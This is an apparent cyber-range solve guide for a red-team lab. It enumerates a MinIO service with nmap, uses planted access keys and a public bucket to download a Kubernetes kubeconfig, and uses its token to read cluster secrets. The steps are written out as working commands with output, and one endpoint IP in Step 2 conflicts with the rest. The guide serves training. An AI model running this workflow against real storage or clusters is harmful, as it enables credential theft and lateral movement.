# Solve Guide — Red Team
## RNG-CLD-01 | M2 — cld-storage | Misconfigured Public Cloud Storage Bucket
**Technique:** T1530 — Data from Cloud Storage Object  
**Pivot In:** AccessKeyId: AKIAPUL2024CLDSVC01 / SecretAccessKey: pULcLd/S3cr3t2024/K3y!  

## Objective
Enumerate the MinIO S3-compatible storage, discover the misconfigured public bucket, and extract the Kubernetes kubeconfig containing the service account token for M3.

## Step 1 — Discover MinIO
```bash
nmap -sV -p 9000,9001 11.0.2.20
# 9000/tcp open MinIO S3 API
# 9001/tcp open MinIO Console
```

<img width="2292" height="939" alt="image" src="https://github.com/user-attachments/assets/1a88677a-55a6-4b3d-822e-819247e57fb6" />


## Step 2 — List Buckets Using Stolen Credentials

**Using AWS CLI:**
```bash
export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'
export AWS_DEFAULT_REGION=us-east-1

aws s3 ls --endpoint-url http://193.0.1.91:9000
# Buckets:
#   pul-cloud-backups
#   pul-cloud-internal
```

## Step 3 — Enumerate the Public Bucket (No Auth Required)

`pul-cloud-backups` has a public anonymous read+list policy — it can be accessed without credentials:

```bash
# List via S3 list-type=2 API (no auth):
curl -s "http://11.0.2.20:9000/pul-cloud-backups?list-type=2" | grep -oP '(?<=<Key>)[^<]+'

# Or with credentials (shows same result):
aws s3 ls s3://pul-cloud-backups/ --recursive --endpoint-url http://11.0.2.20:9000
```

Output — key directories:
```
backups/db-backup-2024-11-14.sql.enc
backups/config-backup-note.txt
configs/deployment-notes.txt
k8s/cloud-ci-kubeconfig.yaml       ← TARGET
k8s/cluster-info.txt
README.txt
```

## Step 4 — Download the Kubeconfig

```bash
# Direct download (no credentials — public bucket):
curl -o cloud-ci-kubeconfig.yaml \
    http://11.0.2.20:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml

# Inspect it:
cat cloud-ci-kubeconfig.yaml
```

Key content:
```yaml
users:
- name: cloud-ci-runner
  user:
    token: pul-cloud-ci-runner-token-2024gridfall
```

The kubeconfig points to `https://11.0.2.30:6443` — the K3s API server on M3.

## Step 5 — Verify Token Works Against M3

```bash
export KUBECONFIG=./cloud-ci-kubeconfig.yaml
kubectl get secrets -n pul-cloud
# NAME             TYPE     DATA
# registry-creds   Opaque   4
# db-creds         Opaque   5
```

Pivot to M3 confirmed. Token grants read access to secrets in `pul-cloud` namespace.

## Summary
| Item | Value |
|---|---|
| Misconfiguration | Public read+list policy on pul-cloud-backups bucket |
| Stolen Artifact | k8s/cloud-ci-kubeconfig.yaml — K8s SA token |
| K8s Token | pul-cloud-ci-runner-token-2024gridfall |
| Next Target | M3 K3s API (11.0.2.30:6443) |
| MITRE | T1530 |
